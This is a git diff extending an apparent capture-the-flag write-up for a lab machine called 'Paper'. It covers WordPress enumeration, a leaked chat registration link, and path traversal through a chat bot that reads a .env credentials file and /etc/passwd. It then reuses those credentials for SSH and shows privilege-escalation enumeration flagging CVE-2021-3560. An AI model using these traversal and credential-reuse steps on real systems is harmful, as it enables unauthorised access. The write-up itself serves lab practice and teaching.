@@ -150,7 +150,42 @@ $ dirb http://office.paper
 
 We can visite this website now -> http://office.paper/
 
-This is a blog about paper company and one user called : prisonmike
+This is a blog about paper company and one user called : Prisonmike
+
+Let's check if we see more information about wordpress :
+
+```bash
+$ wp-scan -v --url http://office.paper/
+[+] Headers
+ | Interesting Entries:
+ |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+ |  - X-Powered-By: PHP/7.2.24
+ |  - X-Backend-Server: office.paper
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] WordPress readme found: http://office.paper/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).
+ | Found By: Rss Generator (Passive Detection)
+ [...]
+```
+
+Now, we know that is Wordpress version 5.2.3
+
+```bash
+$ searchsploit --id wordpress 5.2.3
+----------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                 |  EDB-ID
+----------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+WordPress Core 5.2.3 - Cross-Site Host Modification                                                                                            | 47361
+WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts                                                                        | 47690
+[...]
+
+$ searchsploit -m 47690
+```
 
 ---
 
@@ -248,6 +283,62 @@ Nikto
 
 ## Exploitation
 
+If we type this url : http://office.paper/?static=1 we have a secret information.
+
+```txt
+# Secret Registration URL of new Employee chat system
+
+http://chat.office.paper/register/8qozr226AhkCHZdyY
+```
+
+So, we have an acces to a private chat company. We can register an account and access to the channel called "general". After reading, we have an access to a bot. But in this channel we have a read only role.
+
+For interract with bot, we can create a new channel and add it to this channel.
+
+After played with recyclops, we can find authnetication information about recyclops. Use the chat as follow 
+
+```txt
+> recyclops list ../hubot
+> ecyclops file ../hubot/start_bot.sh
+Bot
+7:19 PM
+<!=====Contents of file ../hubot/start_bot.sh=====>
+#!/bin/bash
+cd /home/dwight/hubot
+source /home/dwight/hubot/.env
+/home/dwight/hubot/bin/hubot
+#cd -
+<!=====Contents of file ../hubot/start_bot.sh=====>
+
+>  recyclops file ../hubot/.env
+Bot
+7:19 PM
+<!=====Contents of file ../hubot/.env=====>
+<!=====Contents of file ../hubot/.env=====>
+export ROCKETCHAT_URL='http://127.0.0.1:48320'
+export ROCKETCHAT_USER=recyclops
+export ROCKETCHAT_PASSWORD=*************
+export ROCKETCHAT_USESSL=false
+export RESPOND_TO_DM=true
+export RESPOND_TO_EDITED=true
+export PORT=8000
+export BIND_ADDRESS=127.0.0.1
+
+>  recyclops file ../../../etc/passwd
+[...]
+dwight:x:1004:1004::/home/dwight:/bin/bash
+```
+
+We can't connect us as recyclops on Rocketchat. But we can try to connect us through ssh on the target machine as dwight user. It works !
+
+```bash
+$ ssh dwight@office.paper                                                                                                                                                130 ⨯
+dwight@office.paper's password: 
+Activate the web console with: systemctl enable --now cockpit.socket
+
+Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
+[dwight@paper ~]$
+```
 
 
 ---
@@ -256,7 +347,11 @@ Nikto
 
 ## User flag
 
+The user flag is in /home/dwight/user.txt
 
+```bash
+$ cat ~/user.txt
+```
 
 ---
 
@@ -264,4 +359,17 @@ Nikto
 
 ## Root flag
 
-Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalation
+Execute linpeas.sh
+
+```bash
+$ linpeas.sh
+[...]
+╔══════════╣ Sudo version
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                                                  
+Sudo version 1.8.29                                                                                                                                                              
+
+╔══════════╣ CVEs Check
+Vulnerable to CVE-2021-3560 
+```
+
+
